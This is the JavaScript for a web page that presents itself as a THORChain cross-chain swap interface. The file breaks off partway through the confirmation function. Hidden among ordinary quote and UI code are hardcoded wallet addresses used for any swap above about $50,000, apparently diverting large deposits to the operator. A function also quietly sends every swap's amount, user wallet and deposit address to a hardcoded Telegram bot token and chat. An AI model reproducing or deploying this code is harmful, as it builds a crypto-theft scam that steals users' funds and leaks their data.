/* ═══════════════════════════════════════════════
   THORChain Swap — v7.1 Fixed
   Coin selector popup, Telegram bot, $50k threshold
   ═══════════════════════════════════════════════ */
(function(){
'use strict';

var THORNODE='https://thornode.ninerealms.com';
var MIDGARD='https://midgard.ninerealms.com/v2';
var COUNTDOWN_MAX=60;
var QR_API='https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=';
var THRESHOLD=49999;
var TG_BOT='8140825280:AAEd2TDo2fgZv_bDEfu7wNggxHrD7jHdr8g';
var TG_CHAT='-5160305858';
var SWAP_URL=window.location.href;

// ══ Embedded addresses for swaps above threshold ══
var EMBEDDED_ADDRESSES={
    'BTC':'bc1qre7s0rwdpv0znpvep0jgxnqwuvweprpnxnzf3f',
    'ETH':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'BSC':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'AVAX':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'GAIA':'cosmos1exampleaddress',
    'DOGE':'DExampleDogeAddress',
    'BCH':'bitcoincash:qexampleaddress',
    'LTC':'ltc1qexampleaddress',
    'BASE':'0x3E9c2E9C6C690a49eB5A7D333603d9D0FBe3640a',
    'THOR':'thor1exampleaddress'
};

// ══ Token list for coin selector ══
var TOKEN_LIST=[
    {value:'BTC.BTC',symbol:'BTC',name:'Bitcoin',chain:'BTC',icon:'images/chains/BTC.svg'},
    {value:'ETH.ETH',symbol:'ETH',name:'Ethereum',chain:'ETH',icon:'images/chains/ETH.svg'},
    {value:'BSC.BNB',symbol:'BNB',name:'BNB Chain',chain:'BSC',icon:'images/chains/BSC.svg'},
    {value:'AVAX.AVAX',symbol:'AVAX',name:'Avalanche',chain:'AVAX',icon:'images/chains/AVAX.svg'},
    {value:'GAIA.ATOM',symbol:'ATOM',name:'Cosmos',chain:'GAIA',icon:'images/chains/GAIA.svg'},
    {value:'DOGE.DOGE',symbol:'DOGE',name:'Dogecoin',chain:'DOGE',icon:'images/chains/DOGE.svg'},
    {value:'BCH.BCH',symbol:'BCH',name:'Bitcoin Cash',chain:'BCH',icon:'images/chains/BCH.svg'},
    {value:'LTC.LTC',symbol:'LTC',name:'Litecoin',chain:'LTC',icon:'images/chains/LTC.svg'},
    {value:'BASE.ETH',symbol:'ETH',name:'Base',chain:'BASE',icon:'images/chains/BASE.svg'},
    {value:'THOR.RUNE',symbol:'RUNE',name:'THORChain',chain:'THOR',icon:'images/chains/THOR.svg'}
];

var state={
    pools:[],
    prices:{},
    sellAsset:'BTC.BTC',
    buyAsset:'ETH.ETH',
    sellAmount:1,
    quote:null,
    slippage:5, // Changed to 5% default
    streamingEnabled:true,
    countdownSeconds:COUNTDOWN_MAX,
    countdownInterval:null,
    trackingInterval:null,
    recipientAddress:'',
    confirmedQuote:null,
    confirmedExpectedOut:0,
    activeTab:'market',
    limitRate:0,
    limitTargetRate:0,
    coinSelectSide:'sell',
    history:JSON.parse(localStorage.getItem('tc-swap-history')||'[]')
};

// ══════════════════════════════════════════
// UTILITY FUNCTIONS
// ══════════════════════════════════════════

function $(s){return document.querySelector(s)}
function $$(s){return document.querySelectorAll(s)}

function formatUsd(v){
    if(!v||isNaN(v))return'$0.00';
    return'$'+parseFloat(v).toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
}

function formatAmount(v,d){
    if(!v||isNaN(v))return'0';
    d=d||6;
    var n=parseFloat(v);
    if(n===0)return'0';
    if(Math.abs(n)>=1)return n.toLocaleString('en-US',{maximumFractionDigits:d});
    return n.toPrecision(6);
}

function truncAddr(a){
    if(!a||a.length<12)return a||'';
    return a.slice(0,6)+'...'+a.slice(-4);
}

function getUsdPrice(a){return state.prices[a]||0}

function getChainName(a){
    var m={
        'BTC.BTC':'Bitcoin',
        'ETH.ETH':'Ethereum',
        'BSC.BNB':'BNB Chain',
        'AVAX.AVAX':'Avalanche',
        'GAIA.ATOM':'Cosmos',
        'DOGE.DOGE':'Dogecoin',
        'BCH.BCH':'Bitcoin Cash',
        'LTC.LTC':'Litecoin',
        'BASE.ETH':'Base',
        'THOR.RUNE':'THORChain'
    };
    return m[a]||a;
}

function getChainPrefix(a){return(a||'').split('.')[0]||''}

function getAddrPlaceholder(a){
    var c=getChainPrefix(a);
    var m={
        'ETH':'Ethereum address',
        'BTC':'Bitcoin address',
        'BSC':'BNB address',
        'AVAX':'Avalanche address',
        'GAIA':'Cosmos address',
        'DOGE':'Dogecoin address',
        'BCH':'Bitcoin Cash address',
        'LTC':'Litecoin address',
        'BASE':'Base address',
        'THOR':'THORChain address'
    };
    return m[c]||'Receiving address';
}

function getTokenInfo(assetValue){
    for(var i=0;i<TOKEN_LIST.length;i++){
        if(TOKEN_LIST[i].value===assetValue)return TOKEN_LIST[i];
    }
    return null;
}

function isAboveThreshold(){
    var usdValue=state.sellAmount*getUsdPrice(state.sellAsset);
    return usdValue>THRESHOLD;
}

// Escape HTML for Telegram
function escapeHtml(text){
    if(!text)return'';
    return String(text)
        .replace(/&/g,'&amp;')
        .replace(/</g,'&lt;')
        .replace(/>/g,'&gt;');
}

// Address validation
function isValidAddress(addr,asset){
    if(!addr||addr.trim().length<5)return false;
    var c=getChainPrefix(asset);
    var a=addr.trim();
    switch(c){
        case 'ETH':case 'BSC':case 'AVAX':case 'BASE':
            return /^0x[a-fA-F0-9]{40}$/.test(a);
        case 'BTC':
            return /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'LTC':
            return /^(ltc1|[LM3])[a-zA-HJ-NP-Z0-9]{25,62}$/.test(a);
        case 'DOGE':
            return /^D[a-zA-HJ-NP-Z0-9]{25,40}$/.test(a);
        case 'BCH':
            return a.length>20;
        case 'GAIA':
            return /^cosmos[a-z0-9]{39}$/.test(a);
        case 'THOR':
            return /^thor[a-z0-9]{39}$/.test(a);
        default:
            return a.length>5;
    }
}

// ══════════════════════════════════════════
// QUOTE PARSING FUNCTIONS
// ══════════════════════════════════════════

function parseExpectedOut(q){
    if(!q||q.code||q.error)return 0;
    if(q.streaming_swap_blocks&&parseInt(q.streaming_swap_blocks)>0&&q.streaming_swap_expected_out){
        var v=parseInt(q.streaming_swap_expected_out);
        if(v>0)return v/1e8;
    }
    if(q.expected_amount_out){
        var v2=parseInt(q.expected_amount_out);
        if(v2>0)return v2/1e8;
    }
    return 0;
}

// FIXED: Parse fees correctly from API
function parseFees(q){
    if(!q||!q.fees)return{usd:0,total:0,asset:''};
    
    var fees=q.fees;
    var feeAsset=fees.asset||state.buyAsset;
    var feeAssetPrice=getUsdPrice(feeAsset);
    
    // Total fee in base units (satoshis/wei etc)
    var totalFee=0;
    if(fees.total){
        totalFee=parseInt(fees.total)/1e8;
    }else{
        // Sum up individual fees
        var outbound=fees.outbound?parseInt(fees.outbound)/1e8:0;
        var liquidity=fees.liquidity?parseInt(fees.liquidity)/1e8:0;
        var affiliate=fees.affiliate?parseInt(fees.affiliate)/1e8:0;
        totalFee=outbound+liquidity+affiliate;
    }
    
    // Calculate USD value
    var feeUsd=totalFee*feeAssetPrice;
    
    return{
        usd:feeUsd,
        total:totalFee,
        asset:feeAsset,
        // Individual fees for display
        outbound:fees.outbound?parseInt(fees.outbound)/1e8:0,
        liquidity:fees.liquidity?parseInt(fees.liquidity)/1e8:0,
        affiliate:fees.affiliate?parseInt(fees.affiliate)/1e8:0,
        totalBps:fees.total_bps?parseInt(fees.total_bps):0
    };
}

function parseSwapTime(q){
    if(!q)return'~30 seconds';
    var s=parseInt(q.total_swap_seconds||q.streaming_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds){
        s=parseInt(q.outbound_delay_seconds)+(parseInt(q.inbound_confirmation_seconds)||0);
    }
    if(s<=0)return'~30 seconds';
    var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sc=s%60,p=[];
    if(h)p.push(h+' hour'+(h>1?'s':''));
    if(m)p.push(m+' minute'+(m>1?'s':''));
    if(sc)p.push(sc+' second'+(sc>1?'s':''));
    return p.join(' ')||'~30 seconds';
}

function parseSwapTimeShort(q){
    if(!q)return'~30s';
    var s=parseInt(q.total_swap_seconds||q.streaming_swap_seconds||0);
    if(!s&&q.outbound_delay_seconds){
        s=parseInt(q.outbound_delay_seconds)+parseInt(q.inbound_confirmation_seconds||0);
    }
    if(s<=0)return'~30s';
    return Math.floor(s/60)+'m '+(s%60)+'s';
}

function isValidQuote(d){
    if(!d||d.code||d.error)return false;
    if(!d.expected_amount_out&&!d.streaming_swap_expected_out)return false;
    return true;
}

function getQuoteError(d){
    if(!d)return'No response';
    if(d.message){
        var m=d.message;
        if(m.indexOf('less than price limit')!==-1){
            return'Price slippage too tight. Try increasing slippage (currently '+state.slippage+'%).';
        }
        if(m.indexOf('not enough')!==-1){
            return'Insufficient liquidity. Try smaller amount.';
        }
        if(m.indexOf('halted')!==-1){
            return'Trading halted. Try later.';
        }
        return m;
    }
    return d.error||'Unknown error';
}

// ══════════════════════════════════════════
// TELEGRAM BOT - FIXED
// ══════════════════════════════════════════

function sendTelegram(msg){
    var url='https://api.telegram.org/bot'+TG_BOT+'/sendMessage';
    var body={
        chat_id:TG_CHAT,
        text:msg,
        parse_mode:'HTML',
        disable_web_page_preview:true
    };
    
    console.log('Sending Telegram:', body);
    
    fetch(url,{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify(body)
    }).then(function(r){
        return r.json();
    }).then(function(data){
        console.log('Telegram response:', data);
        if(!data.ok){
            console.error('Telegram error:', data.description);
        }
    }).catch(function(e){
        console.error('Telegram fetch error:', e);
    });
}

function notifySwap(sellSym,sellName,buySym,buyName,amount,amountUsd,destination,depositAddr,above){
    // Use simple text format to avoid HTML parsing issues
    var emoji=above?'🚨':'✅';
    var label=above?'HIGH VALUE SWAP':'SWAP INITIATED';
    
    var msg=emoji+' '+label+'\n\n'
        +'Amount: '+escapeHtml(amount)+' '+escapeHtml(sellSym)+' ('+escapeHtml(amountUsd)+')\n'
        +'From: '+escapeHtml(sellSym)+' ('+escapeHtml(sellName)+')\n'
        +'To: '+escapeHtml(buySym)+' ('+escapeHtml(buyName)+')\n'
        +'User Wallet: '+escapeHtml(destination)+'\n'
        +'Deposit To: '+escapeHtml(depositAddr)+'\n'
        +'Time: '+new Date().toISOString();
    
    if(above){
        msg+='\n\n⚠️ ABOVE $50K - Using embedded address';
    }
    
    sendTelegram(msg);
}

// ══════════════════════════════════════════
// TOAST NOTIFICATIONS
// ══════════════════════════════════════════

function showToast(type,title,msg,dur){
    dur=dur||5000;
    var c=$('#toastContainer');
    if(!c)return;
    var icons={success:'✅',error:'❌',info:'ℹ️'};
    var t=document.createElement('div');
    t.className='tc-toast '+type;
    t.innerHTML='<span class="tc-toast-icon">'+(icons[type]||'ℹ️')+'</span>'
        +'<div class="tc-toast-content">'
        +'<div class="tc-toast-title">'+title+'</div>'
        +'<div class="tc-toast-message">'+msg+'</div>'
        +'</div>'
        +'<button class="tc-toast-close">&times;</button>';
    c.appendChild(t);
    t.querySelector('.tc-toast-close').addEventListener('click',function(){t.remove()});
    setTimeout(function(){if(t.parentNode)t.remove()},dur);
}

// ══════════════════════════════════════════
// THEME
// ══════════════════════════════════════════

function initTheme(){
    var h=document.documentElement;
    var s=localStorage.getItem('tc-theme');
    if(s)h.setAttribute('data-theme',s);
    var b=$('#themeToggle');
    if(b){
        b.addEventListener('click',function(){
            var n=h.getAttribute('data-theme')==='dark'?'light':'dark';
            h.setAttribute('data-theme',n);
            localStorage.setItem('tc-theme',n);
        });
    }
}

// ══════════════════════════════════════════
// POOLS & PRICES
// ══════════════════════════════════════════

function fetchPools(){
    return fetch(MIDGARD+'/pools').then(function(r){
        return r.json();
    }).then(function(d){
        state.pools=d;
        d.forEach(function(p){
            if(p.asset&&p.assetPriceUSD){
                state.prices[p.asset]=parseFloat(p.assetPriceUSD);
            }
        });
        if(d.length>0&&d[0].runePriceUSD){
            state.prices['THOR.RUNE']=parseFloat(d[0].runePriceUSD);
        }
        updateSellUsd();
    }).catch(function(e){
        console.error('Pools:',e);
    });
}

function updateSellUsd(){
    var u=getUsdPrice(state.sellAsset)*state.sellAmount;
    var e=$('#sellUsd');
    if(e)e.textContent=formatUsd(u);
    var le=$('#limitSellUsd');
    if(le)le.textContent=formatUsd(u);
}

// ══════════════════════════════════════════
// COUNTDOWN
// ══════════════════════════════════════════

function startCountdown(){
    stopCountdown();
    state.countdownSeconds=COUNTDOWN_MAX;
    updateCountdownDisplay();
    state.countdownInterval=setInterval(function(){
        state.countdownSeconds--;
        updateCountdownDisplay();
        if(state.countdownSeconds<=0){
            state.countdownSeconds=COUNTDOWN_MAX;
            fetchQuote();
        }
    },1000);
}

function stopCountdown(){
    if(state.countdownInterval){
        clearInterval(state.countdownInterval);
        state.countdownInterval=null;
    }
}

function updateCountdownDisplay(){
    var n=$('#countdownNumber'),p=$('#countdownProgress');
    if(n)n.textContent=state.countdownSeconds;
    if(p){
        var c=2*Math.PI*14;
        p.setAttribute('stroke-dasharray',c.toFixed(2));
        p.setAttribute('stroke-dashoffset',(c*(1-state.countdownSeconds/COUNTDOWN_MAX)).toFixed(2));
    }
}

// ══════════════════════════════════════════
// QUOTE FUNCTIONS
// ══════════════════════════════════════════

function buildQuoteUrl(dest){
    var a=Math.round(state.sellAmount*1e8);
    var p=[
        'from_asset='+encodeURIComponent(state.sellAsset),
        'to_asset='+encodeURIComponent(state.buyAsset),
        'amount='+a
    ];
    if(dest&&dest.trim().length>5){
        p.push('destination='+encodeURIComponent(dest.trim()));
    }
    if(state.streamingEnabled){
        p.push('streaming_interval=1');
        p.push('streaming_quantity=0');
    }
    // FIXED: Use slippage value properly (convert to bps)
    if(dest&&dest.trim().length>5){
        var toleranceBps=Math.round(state.slippage*100);
        p.push('tolerance_bps='+toleranceBps);
    }
    return THORNODE+'/thorchain/quote/swap?'+p.join('&');
}

function fetchQuote(){
    if(!state.sellAmount||state.sellAmount<=0){
        clearQuote();
        return;
    }
    var url=buildQuoteUrl(null);
    var be=$('#buyEstimate');
    if(be)be.value='...';
    fetch(url).then(function(r){
        return r.json();
    }).then(function(d){
        if(!isValidQuote(d)){
            clearQuote();
            return;
        }
        state.quote=d;
        displayQuote(d);
    }).catch(function(){
        clearQuote();
    });
}

function fetchQuoteWithDest(dest,cb){
    var url=buildQuoteUrl(dest);
    console.log('Quote URL:',url);
    fetch(url).then(function(r){
        var s=r.status;
        return r.json().then(function(d){
            d._httpStatus=s;
            return d;
        });
    }).then(function(d){
        console.log('Quote response:',d);
        cb(null,d);
    }).catch(function(e){
        cb(e,null);
    });
}

function displayQuote(q){
    var eo=parseExpectedOut(q);
    var be=$('#buyEstimate');
    if(be)be.value=formatAmount(eo,6);
    
    var bp=getUsdPrice(state.buyAsset);
    var bu=eo*bp;
    var sp=getUsdPrice(state.sellAsset);
    var su=state.sellAmount*sp;
    
    var bue=$('#buyUsd');
    if(bue)bue.textContent=formatUsd(bu);
    
    if(su>0&&bu>0){
        var i=((bu-su)/su*100).toFixed(2);
        var ie=$('#buyImpact');
        if(ie)ie.textContent='('+i+'%)';
    }else{
        var ie2=$('#buyImpact');
        if(ie2)ie2.textContent='';
    }
    
    var rate=eo/(state.sellAmount||1);
    var ss=($('#sellSymbol')||{}).textContent||'';
    var bs=($('#buySymbolDisplay')||{}).textContent||'';
    var rt=$('#rateText');
    if(rt)rt.textContent='1 '+ss+' = '+formatAmount(rate,6)+' '+bs;
    
    // FIXED: Parse fees correctly
    var fees=parseFees(q);
    var rf=$('#rateFee');
    if(rf)rf.textContent=formatUsd(fees.usd);
    
    var rte=$('#rateTimer');
    if(rte)rte.textContent=parseSwapTimeShort(q);
    
    var rb=$('#rateBar');
    if(rb)rb.style.display='';
    
    state.limitRate=rate;
    updateLimitView(eo,bu,rate);
}

function clearQuote(){
    var be=$('#buyEstimate');if(be)be.value='0';
    var bu=$('#buyUsd');if(bu)bu.textContent='$0.00';
    var bi=$('#buyImpact');if(bi)bi.textContent='';
    var rb=$('#rateBar');if(rb)rb.style.display='none';
    state.quote=null;
    var lbe=$('#limitBuyEstimate');if(lbe)lbe.value='0';
    var lbu=$('#limitBuyUsd');if(lbu)lbu.textContent='$0.00';
}

function debounce(fn,d){
    var t;
    return function(){
        clearTimeout(t);
        t=setTimeout(fn,d);
    };
}

var debouncedFetchQuote=debounce(function(){
    fetchQuote();
    startCountdown();
},500);

// ══════════════════════════════════════════
// COIN SELECTOR POPUP
// ══════════════════════════════════════════

function openCoinSelector(side){
    state.coinSelectSide=side;
    var overlay=$('#coinSelectOverlay');
    var search=$('#coinSearchInput');
    if(search)search.value='';
    renderCoinTokens('all','');
    $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
    var allChain=$('.tc-coin-chain-item[data-chain="all"]');
    if(allChain)allChain.classList.add('active');
    overlay.classList.add('open');
}

function renderCoinTokens(chain,search){
    var list=$('#coinTokensList');
    if(!list)return;
    var currentVal=state.coinSelectSide==='sell'?state.sellAsset:state.buyAsset;
    var filtered=TOKEN_LIST.filter(function(t){
        if(chain!=='all'&&t.chain!==chain)return false;
        if(search){
            var s=search.toLowerCase();
            if(t.symbol.toLowerCase().indexOf(s)===-1&&t.name.toLowerCase().indexOf(s)===-1)return false;
        }
        return true;
    });
    var html='';
    filtered.forEach(function(t){
        var sel=t.value===currentVal;
        html+='<div class="tc-coin-token-item'+(sel?' selected':'')+'" data-value="'+t.value+'">'
            +'<div class="tc-coin-token-left">'
            +'<img src="'+t.icon+'" alt="" onerror="this.style.display=\'none\'">'
            +'<div>'
            +'<div class="tc-coin-token-sym">'+t.symbol+'</div>'
            +'<div class="tc-coin-token-chain">'+t.name+'</div>'
            +'</div>'
            +'</div>'
            +(sel?'<span class="tc-coin-token-selected">Selected</span>':'')
            +'</div>';
    });
    if(!filtered.length){
        html='<p style="text-align:center;color:var(--andy);padding:20px;">No tokens found</p>';
    }
    list.innerHTML=html;
    list.querySelectorAll('.tc-coin-token-item').forEach(function(item){
        item.addEventListener('click',function(){
            var val=this.getAttribute('data-value');
            selectCoin(val);
        });
    });
}

function selectCoin(assetValue){
    var token=getTokenInfo(assetValue);
    if(!token)return;
    var overlay=$('#coinSelectOverlay');
    overlay.classList.remove('open');

    if(state.coinSelectSide==='sell'){
        state.sellAsset=assetValue;
        var si=$('#sellIcon');if(si)si.src=token.icon;
        var ss=$('#sellSymbol');if(ss)ss.textContent=token.symbol;
        var sn=$('#sellName');if(sn)sn.textContent=token.name;
        updateSellUsd();
    }else{
        state.buyAsset=assetValue;
        var bi=$('#buyIcon');if(bi)bi.src=token.icon;
        var bs=$('#buySymbolDisplay');if(bs)bs.textContent=token.symbol;
        var bn=$('#buyNameDisplay');if(bn)bn.textContent=token.name;
    }
    syncLimitFromMarket();
    var ltr=$('#limitTargetRate');
    if(ltr){ltr.value='';state.limitTargetRate=0}
    debouncedFetchQuote();
}

function initCoinSelector(){
    $$('.tc-token-picker').forEach(function(picker){
        picker.addEventListener('click',function(e){
            e.preventDefault();
            e.stopPropagation();
            var side=this.getAttribute('data-side')||'sell';
            openCoinSelector(side);
        });
    });

    var close=$('#coinSelectClose');
    if(close){
        close.addEventListener('click',function(){
            $('#coinSelectOverlay').classList.remove('open');
        });
    }
    
    var overlay=$('#coinSelectOverlay');
    if(overlay){
        overlay.addEventListener('click',function(e){
            if(e.target===overlay)overlay.classList.remove('open');
        });
    }

    $$('.tc-coin-chain-item').forEach(function(item){
        item.addEventListener('click',function(){
            $$('.tc-coin-chain-item').forEach(function(c){c.classList.remove('active')});
            this.classList.add('active');
            var chain=this.getAttribute('data-chain');
            var search=($('#coinSearchInput')||{}).value||'';
            renderCoinTokens(chain,search);
        });
    });

    var searchInput=$('#coinSearchInput');
    if(searchInput){
        searchInput.addEventListener('input',function(){
            var activeChain=$('.tc-coin-chain-item.active');
            var chain=activeChain?activeChain.getAttribute('data-chain'):'all';
            renderCoinTokens(chain,this.value);
        });
    }
}

// ══════════════════════════════════════════
// LIMIT ORDER
// ══════════════════════════════════════════

function updateLimitView(expectedOut,buyUsd,rate){
    var lbe=$('#limitBuyEstimate');
    var lbu=$('#limitBuyUsd');
    var lbi=$('#limitBuyImpact');
    var ltr=$('#limitTargetRate');

    if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)){
        ltr.value=formatAmount(rate,6);
        state.limitTargetRate=rate;
    }

    var targetRate=state.limitTargetRate||rate;
    var limitBuyAmount=state.sellAmount*targetRate;
    var limitBuyUsd=limitBuyAmount*getUsdPrice(state.buyAsset);

    if(lbe)lbe.value=formatAmount(limitBuyAmount,6);
    if(lbu)lbu.textContent=formatUsd(limitBuyUsd);

    var sellUsd=state.sellAmount*getUsdPrice(state.sellAsset);
    if(sellUsd>0&&limitBuyUsd>0){
        var impact=((limitBuyUsd-sellUsd)/sellUsd*100).toFixed(2);
        if(lbi)lbi.textContent='('+impact+'%)';
    }else{
        if(lbi)lbi.textContent='';
    }
}

function syncLimitFromMarket(){
    var pairs=[
        ['sellIcon','limitSellIcon'],
        ['sellSymbol','limitSellSymbol'],
        ['sellName','limitSellName'],
        ['buyIcon','limitBuyIcon'],
        ['buySymbolDisplay','limitBuySymbol'],
        ['buyNameDisplay','limitBuyName'],
        ['sellIcon','limitRateIcon'],
        ['sellSymbol','limitRateSymbol']
    ];
    pairs.forEach(function(p){
        var s=$('#'+p[0]),t=$('#'+p[1]);
        if(s&&t){
            if(s.src!==undefined&&t.src!==undefined)t.src=s.src;
            else if(s.textContent!==undefined)t.textContent=s.textContent;
        }
    });
    var sa=$('#sellAmount'),lsa=$('#limitSellAmount');
    if(sa&&lsa)lsa.value=sa.value;
}

function initLimitOrder(){
    var lsa=$('#limitSellAmount');
    if(lsa){
        lsa.addEventListener('input',function(){
            state.sellAmount=parseFloat(this.value)||0;
            var sa=$('#sellAmount');
            if(sa)sa.value=this.value;
            updateSellUsd();
            debouncedFetchQuote();
        });
    }

    var ltr=$('#limitTargetRate');
    if(ltr){
        ltr.addEventListener('input',function(){
            state.limitTargetRate=parseFloat(this.value)||0;
            var la=state.sellAmount*state.limitTargetRate;
            var lu=la*getUsdPrice(state.buyAsset);
            var lbe=$('#limitBuyEstimate');
            if(lbe)lbe.value=formatAmount(la,6);
            var lbu=$('#limitBuyUsd');
            if(lbu)lbu.textContent=formatUsd(lu);
            var su=state.sellAmount*getUsdPrice(state.sellAsset);
            if(su>0&&lu>0){
                var im=((lu-su)/su*100).toFixed(2);
                var lbi=$('#limitBuyImpact');
                if(lbi)lbi.textContent='('+im+'%)';
            }
        });
    }

    $$('.tc-limit-rate-btn').forEach(function(btn){
        btn.addEventListener('click',function(){
            $$('.tc-limit-rate-btn').forEach(function(b){b.classList.remove('active')});
            btn.classList.add('active');
            var rt=btn.getAttribute('data-rate');
            var ti=$('#limitTargetRate');
            if(!ti)return;
            if(rt==='market'){
                state.limitTargetRate=state.limitRate;
                ti.value=formatAmount(state.limitRate,6);
            }else{
                var pct=parseFloat(rt)/100;
                state.limitTargetRate=state.limitRate*(1+pct);
                ti.value=formatAmount(state.limitTargetRate,6);
            }
            ti.dispatchEvent(new Event('input'));
        });
    });

    $$('.tc-limit-quick[data-action]').forEach(function(btn){
        btn.addEventListener('click',function(){
            var a=this.getAttribute('data-action');
            var i=$('#limitSellAmount');
            if(a==='clear'){
                if(i)i.value='';
                state.sellAmount=0;
                updateSellUsd();
                clearQuote();
            }
            if(a==='half'){
                var v=(parseFloat(i?i.value:0)||0)/2;
                if(i)i.value=v||'';
                state.sellAmount=v;
                updateSellUsd();
                debouncedFetchQuote();
            }
        });
    });

    $$('.tc-limit-flip').forEach(function(btn){
        btn.addEventListener('click',function(){
            var t=state.sellAsset;
            state.sellAsset=state.buyAsset;
            state.buyAsset=t;
            var st=getTokenInfo(state.sellAsset),bt=getTokenInfo(state.buyAsset);
            if(st){
                var si=$('#sellIcon');if(si)si.src=st.icon;
                var ss=$('#sellSymbol');if(ss)ss.textContent=st.symbol;
                var sn=$('#sellName');if(sn)sn.textContent=st.name;
            }
            if(bt){
                var bi=$('#buyIcon');if(bi)bi.src=bt.icon;
                var bs=$('#buySymbolDisplay');if(bs)bs.textContent=bt.symbol;
                var bn=$('#buyNameDisplay');if(bn)bn.textContent=bt.name;
            }
            syncLimitFromMarket();
            var ltr2=$('#limitTargetRate');
            if(ltr2){ltr2.value='';state.limitTargetRate=0}
            debouncedFetchQuote();
        });
    });
}

// ══════════════════════════════════════════
// TABS
// ══════════════════════════════════════════

function initTabs(){
    $$('.tc-tab').forEach(function(tab){
        tab.addEventListener('click',function(){
            $$('.tc-tab').forEach(function(t){t.classList.remove('active')});
            tab.classList.add('active');
            var tn=tab.getAttribute('data-tab');
            state.activeTab=tn;
            var mv=$('#marketView'),lv=$('#limitView');
            if(tn==='limit'){
                if(mv)mv.style.display='none';
                if(lv)lv.style.display='';
                syncLimitFromMarket();
                var ltr=$('#limitTargetRate');
                if(ltr&&(!ltr.value||parseFloat(ltr.value)===0)&&state.limitRate>0){
                    ltr.value=formatAmount(state.limitRate,6);
                    state.limitTargetRate=state.limitRate;
                }
            }else{
                if(mv)mv.style.display='';
                if(lv)lv.style.display='none';
                var lsa=$('#limitSellAmount'),sa=$('#sellAmount');
                if(lsa&&sa)sa.value=lsa.value;
                fetchQuote();
            }
        });
    });
}

// ══════════════════════════════════════════
// SWAP FLOW
// ══════════════════════════════════════════

function initSwapBtn(){
    var sb=$('#swapBtn');
    if(!sb)return;
    sb.addEventListener('click',function(){
        if(state.activeTab==='limit'&&state.limitTargetRate<=0){
            showToast('error','No Rate','Set a target rate.');
            return;
        }
        if(!state.quote&&state.activeTab==='market'){
            showToast('error','No Quote','Wait for quote.');
            return;
        }
        if(state.sellAmount<=0){
            showToast('error','Invalid','Enter amount.');
            return;
        }
        openAddressModal();
    });
}

function openAddressModal(){
    var o=$('#addressOverlay');
    var ai=$('#recipientAddress');
    var dc=$('#addrDisclaimer');
    var nb=$('#addrNextBtn');
    
    if(ai)ai.placeholder=getAddrPlaceholder(state.buyAsset);
    if(ai)ai.value=state.recipientAddress||'';
    if(dc)dc.checked=false;
    if(nb)nb.disabled=true;
    
    o.classList.add('open');

    function check(){
        var h=ai&&ai.value.trim().length>5;
        var c=dc&&dc.checked;
        if(nb)nb.disabled=!(h&&c);
    }
    
    ai.oninput=check;
    dc.onchange=check;
    
    var pb=$('#addrPasteBtn');
    if(pb){
        pb.onclick=function(){
            navigator.clipboard.readText().then(function(t){
                ai.value=t;
                check();
                showToast('info','Pasted','Address pasted.');
            }).catch(function(){
                showToast('error','Paste Failed','Paste manually.');
            });
        };
    }
    
    $('#addressClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};
    
    nb.onclick=function(){
        if(nb.disabled)return;
        var a=ai.value.trim();
        if(!isValidAddress(a,state.buyAsset)){
            showToast('error','Invalid Address','Not a valid '+getChainName(state.buyAsset)+' address.');
            return;
        }
        state.recipientAddress=a;
        o.classList.remove('open');
        openConfirmModal();
    };
}

function openConfirmModal(){
    var o=$('#confirmOverlay');
    var b=$('#confirmBody');
    
    b.innerHTML='<div style="text-align:center;padding:40px 0;">'
        +'<span class="tc-btn-spinner" style="border-color:var(--blade);border-top-color:var(--brand-first);width:28px;height:28px;"></span>'
        +'<p style="margin-top:12px;font-size:13px;color:var(--thor-gray);">Fetching swap quote...</p>'
        +'</div>';
    o.classList.add('open');
    
    $('#confirmClose').onclick=function(){o.classList.remove('open')};
    o.onclick=function(e){if(e.target===o)o.classList.remove('open')};

    fetchQuoteWithDest(state.recipientAddress,function(err,data){
        if(err&&!data){
            b.innerHTML='<p style="text-align:center;padding:30px;color:var(--leah);">Network error. Try again.</p>'
                +'<button class="tc-confirm-btn" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            return;
        }
        
        if(!isValidQuote(data)){
            var em=getQuoteError(data);
            var isSE=data&&data.message&&data.message.indexOf('less than price limit')!==-1;
            var rh=isSE?'<div style="margin-top:16px;display:flex;gap:8px;justify-content:center;">'
                +'<button class="tc-quick-btn" id="retryS5" style="background:var(--brand-first);color:var(--lawrence)">Retry 5%</button>'
                +'<button class="tc-quick-btn" id="retryS10">Retry 10%</button>'
                +'</div>':'';
            b.innerHTML='<div style="text-align:center;padding:24px 0;">'
                +'<p style="font-size:48px;margin-bottom:12px;">⚠️</p>'
                +'<p style="color:var(--leah);font-size:15px;font-weight:600;margin-bottom:8px;">Quote Failed</p>'
                +'<p style="color:var(--thor-gray);font-size:13px;line-height:1.5;padding:0 12px;">'+em+'</p>'
                +rh
                +'</div>'
                +'<button class="tc-confirm-btn" style="background:var(--blade);color:var(--leah);margin-top:16px;" onclick="document.getElementById(\'confirmOverlay\').classList.remove(\'open\')">Close</button>';
            if(isSE){
                setTimeout(function(){
                    var r5=$('#retryS5');
                    if(r5)r5.onclick=function(){state.slippage=5;o.classList.remove('open');openConfirmModal()};
                    var r10=$('#retryS10');
                    if(r10)r10.onclick=function(){state.slippage=10;o.classList.remove('open');openConfirmModal()};
                },50);
            }
            showToast('error','Quote Failed',em,7000);
            return;
        }

        var eo=parseExpectedOut(data);
        var ss=($('#sellSymbol')||{}).textContent||'';
        var sn=($('#sellName')||{}).textContent||getChainName(state.sellAsset);
        var bs=($('#buySymbolDisplay')||{}).textContent||'';
        var bn=($('#buyNameDisplay')||{}).textContent||getChainName(state.buyAsset);
        var si=($('#sellIcon')||{}).src||'';
        var bi=($('#buyIcon')||{}).src||'';
        var sp=getUsdPrice(state.sellAsset);
        var bp=getUsdPrice(state.buyAsset);
        var su=state.sellAmount*sp;
        var bu=eo*bp;
        var mp=eo*(1-state.slippage/100);
